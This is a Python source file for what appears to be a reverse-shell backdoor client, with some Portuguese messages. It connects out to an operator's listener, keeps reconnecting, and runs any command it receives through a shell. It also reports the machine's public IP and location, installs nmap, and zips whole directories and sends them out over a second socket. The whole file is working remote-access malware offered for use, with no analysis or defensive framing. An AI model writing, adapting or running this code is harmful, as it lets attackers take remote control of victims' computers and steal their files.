import socket
import time
import subprocess
import os
import zipfile
import requests
import platform

ip = "127.0.0.1"
port = 8081

def connection(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(b"\n[!] Connection received.\n")
            return s
        except socket.error as e:
            print("Connection error:", e)
            time.sleep(10)

def listen(s):
    try:
        while True:
            data = s.recv(1024)
            if not data:
                print("[!] Connection closed by the client.")
                return False  

            command = data[:-1].decode()
            if command == "quit":
                print("[!] Closing connection as requested by the client.")
                s.close()
                return False  
            else:
                cmd(s, command)
    except ConnectionResetError:
        print("[!] The connection was closed by the remote host.")
        return False  
    except Exception as e:
        print("Error in listen:", e)
        return False

def cmd(s, data):
    try:
        if data.startswith("help"):
            help_text = """\n##########
Manual:
-[execute] - to execute commands with a message returned for you;
-[cd] - to change directory;
-[ls or dir] - to list files;
-[info_ip] - to see IP addresses.
-[Download] - Download mode for files from the server;
-[Upload] - to upload files from your computer;
-[quit] - to exit.
-[nmap-install] - install or use nmap
##########\n\n"""
            send_data(s, help_text)

        elif data.startswith("execute"):
            command = data.split(" ", 1)[1]
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            send_data(s, output.stdout)

        elif data.startswith("cd") or data.startswith("Cd"):
            directory = data.split(" ", 1)[1]
            os.chdir(directory)
            send_data(s, "[+] Directory changed successfully.\n")

        elif data.startswith("Download"):
            server(s)

        elif data.startswith("Upload"):
            s.send(b"Enter the directory to zip> ")
            directory_name = s.recv(1024).decode('utf-8').strip()
            client_path(s, directory_name)

        elif data.startswith("info_ip"):
            get_information_ip(s)
        elif data.startswith("nmap-install"):
            install_nmap(s)

        else:
            output = subprocess.run(data, shell=True, capture_output=True, text=True)
            send_data(s, output.stdout)

    except Exception as e:
        print("Error in cmd:", e)
        send_data(s, "\n[!] Command not recognized.\n")
    except ConnectionResetError:
        print("The connection was closed by the remote host.")

def get_information_ip(s):
    try:
        resposta = requests.get("https://ipinfo.io")
        if resposta.status_code == 200:
            dados_ip = resposta.json()
            info_string = (
                f"IP Público: {dados_ip['ip']}\n"
                f"Cidade: {dados_ip['city']}\n"
                f"Região: {dados_ip['region']}\n"
                f"País: {dados_ip['country']}\n"
                f"Provedor de Internet: {dados_ip['org']}\n"
            )
        else:
            error = f"Falha na solicitação: {resposta.status_code}"
            send_data(s, error)
            return

        local_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        local_socket.connect(("8.8.8.8", 80))  
        ip_local = local_socket.getsockname()[0]
        local_socket.close()

        output = f"\n##########\n{info_string}IP Local: {ip_local}\n##########\n"
        send_data(s, output)

    except requests.exceptions.RequestException as req_error:
        send_data(s, f"Erro ao obter informações do IP: {req_error}")
    except Exception as e:
        send_data(s, f"Erro inesperado: {e}")

def install_nmap(s):
    sistema = platform.system()

    command = "where nmap" if sistema == "Windows" else "which nmap"
    try:
        subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        send_data(s, "nmap is already installed.")
        return
    except subprocess.CalledProcessError:
        pass  

    if sistema == "Windows":
        send_data(s, "[!] Installing nmap on Windows...\n")
        subprocess.run("winget install Insecure.nmap", shell=True, check=True)
        send_data(s, "[+] Installation completed.")
        
    elif sistema == "Linux":
        send_data(s, "[!] Installing nmap on Linux...")
        subprocess.run("apt install nmap -y", shell=True, check=True)
        send_data(s, "[+] Installation completed.")
    else:
        send_data(s, "This is another platform")

def send_data(s, data):
    s.send(data.encode('utf-8'))

def compactar_diretorio(diretorio, arquivo_saida):
    with zipfile.ZipFile(arquivo_saida, 'w') as zipf:
        for raiz, _, arquivos in os.walk(diretorio):
            for arquivo in arquivos:
                caminho_completo = os.path.join(raiz, arquivo)
                zipf.write(caminho_completo, os.path.relpath(caminho_completo, diretorio))

def client_path(s, directory_name):
    try:
        if not os.path.isdir(directory_name):
            send_data(s, "\n[!] Invalid directory closing client connection.\n")
            return

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        send_data(s, b"\n[!] Trying connection with the server...\n")
        client.connect(('127.0.0.1', 8887))
        send_data(s, b"\n[!] Connection Received from the server.\n")

        client.send(directory_name.encode('utf-8'))
        with open('received_file.zip', 'wb') as file:
            while True:
                data = client.recv(4096)
                if not data:
                    break
                file.write(data)
        send_data(s, b'\n[+] File received as received_file.zip [ok]\n')
        client.close()

    except ConnectionRefusedError as e:
        print("\nConnection error: ", e)
    except Exception as e:
        print("\nConnection error: ", e)

def clear_zip():
    zip_file = "received_file.zip"
    if os.path.isfile(zip_file):
        os.remove(zip_file)

def server(s):
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind(('127.0.0.1', 8889))
        server_socket.listen(1)

        send_data(s, b'\n[!] Waiting for a connection...\n')
        connection, address = server_socket.accept()
        print(f'Connection from {address}')

        send_data(s, b"\n[!] Connection received! \n")
        diretorio_cliente = connection.recv(1024).decode('utf-8')

        if not os.path.exists(diretorio_cliente) or not os.path.isdir(diretorio_cliente):
            print(f"Directory '{diretorio_cliente}' does not exist or is not a directory.")
            send_data(s, b"\n[!] Directory does not exist or is not a directory!\n")
            connection.close()
            return

        arquivo_zip_saida = 'received_file.zip'
        compactar_diretorio(diretorio_cliente, arquivo_zip_saida)

        if os.path.getsize(arquivo_zip_saida) == 0:
            print(f"\nFailed to create ZIP file for directory '{diretorio_cliente}'.\n")
            send_data(s, b"\n[!] Failed to create ZIP file for directory.\n")
            connection.close()
            return

        with open(arquivo_zip_saida, 'rb') as file:
            while True:
                data = file.read(4096)  
                if not data:
                    break
                connection.sendall(data) 

        send_data(s, b'\n[+] ZIP file sent.\n')
        clear_zip()
    except Exception as e:
        print("[ERROR] Failure: ", e)
        send_data(s, b'[ERROR] Failure on the server.\n')

def main():
    while True:
        try:
            s_connected = connection(ip, port)
            if s_connected:
                should_continue = listen(s_connected)
                if not should_continue:
                    print("[!] Attempting to reconnect...")
                    time.sleep(5)  
            else:
                print("Connection was wrong, trying again.")
                time.sleep(5)  
        except Exception as e:
            print("Main error: ", e)
            time.sleep(5)

if __name__ == "__main__":
    main()
